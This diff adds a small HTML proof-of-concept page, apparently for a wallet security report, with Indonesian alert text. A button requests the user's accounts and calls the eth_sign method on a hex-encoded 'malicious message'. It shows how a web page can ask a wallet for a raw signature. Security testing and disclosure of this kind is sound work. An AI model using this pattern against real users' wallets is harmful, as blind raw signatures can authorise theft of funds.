@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unapproved eth_sign PoC</title>
+</head>
+<body>
+    <h1>test</h1>
+    <button onclick="exploitEthSign()">Trigger Unapproved eth_sign</button>
+
+    <script>
+        function stringToHex(str) {
+            const encoder = new TextEncoder();
+            const bytes = encoder.encode(str);
+            let hex = '0x';
+            for (const byte of bytes) {
+                hex += byte.toString(16).padStart(2, '0');
+            }
+            return hex;
+        }
+
+        async function exploitEthSign() {
+            if (!window.ethereum) {
+                alert('MetaMask atau wallet kompatibel tidak terdeteksi!');
+                return;
+            }
+
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const fromAddress = accounts[0];
+
+                const messageText = 'This is a malicious message!';
+                const messageToSign = stringToHex(messageText);
+
+                console.log('Attempting to send eth_sign request...');
+                console.log('Message (hex):', messageToSign);
+
+                const signature = await window.ethereum.request({
+                    method: 'eth_sign',
+                    params: [fromAddress, messageToSign],
+                });
+
+                console.log('Signature received:', signature);
+                alert('eth_sign berhasil! Tanda tangan: ' + signature);
+            } catch (error) {
+                console.error('Error during eth_sign:', error);
+                alert('Error: ' + error.message);
+            }
+        }
+    </script>
+</body>
+</html>
